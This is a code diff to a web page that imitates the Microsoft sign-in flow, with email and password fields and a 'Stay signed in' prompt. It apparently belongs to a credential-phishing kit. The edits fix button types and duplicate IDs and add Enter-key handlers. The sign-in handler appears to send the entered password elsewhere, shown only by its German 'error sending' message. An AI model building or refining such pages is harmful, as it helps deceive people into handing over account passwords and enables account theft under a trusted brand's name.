@@ -322,7 +322,7 @@
         <div class="auth-wrapper">
             <img src="logo.png" alt="Microsoft" />
             <h2 class="title mb-16 mt-16">Sign in</h2>
-            <form>
+            <form id="form_uname" onsubmit="return false;">
                 <div class="mb-16">
                     <p id="error_uname" class="error"></p>
                     <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" />
@@ -337,7 +337,7 @@
                 </p>
             </div>
             <div>
-                <button class="btn" id="btn_next">Next</button>
+                <button class="btn" id="btn_next" type="button">Next</button>
             </div>
         </div>
         <div class="opts">
@@ -350,13 +350,13 @@
         <div class="auth-wrapper">
             <img src="logo.png" alt="Microsoft" class="d-block" />
             <div class="identity w-100 mt-16 mb-16">
-                <button class="back">
+                <button class="back" type="button">
                     <img src="back.png" />
                 </button>
                 <span id="user_identity">a@b.com</span>
             </div>
             <h2 class="title mb-16">Enter password</h2>
-            <form>
+            <form id="form_pwd" onsubmit="return false;">
                 <div class="mb-16">
                     <p id="error_pwd" class="error"></p>
                     <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" />
@@ -369,7 +369,7 @@
                 </p>
             </div>
             <div>
-                <button class="btn" id="btn_sig">Sign in</button>
+                <button class="btn" id="btn_sig" type="button">Sign in</button>
             </div>
         </div>
     </section>
@@ -387,8 +387,8 @@
                 <span>Don't show this again</span>
             </label>
             <div class="btn-group">
-                <button class="btn btn-sec" id="btn_final">No</button>
-                <button class="btn" id="btn_final">Yes</button>
+                <button class="btn btn-sec" id="btn_no" type="button">No</button>
+                <button class="btn" id="btn_yes" type="button">Yes</button>
             </div>
         </div>
     </section>
@@ -408,8 +408,7 @@
         /////next button
         const nxt = document.getElementById('btn_next');
 
-        nxt.addEventListener('click', (e) => {
-            e.preventDefault();
+        nxt.addEventListener('click', () => {
             //validate the form
             validate();
             if (unameVal) {
@@ -422,12 +421,19 @@
             }
         })
 
+        // Enter Key Handler für Email
+        unameInp.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                nxt.click();
+            }
+        })
+
         //////sign in button
 
         const sig = document.getElementById('btn_sig');
 
-        sig.addEventListener('click', async (e) => {
-            e.preventDefault();
+        sig.addEventListener('click', async () => {
             //validate the form
             validate();
             if (pwdVal) {
@@ -454,6 +460,14 @@
                     console.error(error);
                     document.getElementById('error_pwd').innerText = "Fehler beim Senden";
                 }
+            }
+        })
+
+        // Enter Key Handler für Passwort
+        pwdInp.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                sig.click();
             }
         })
 
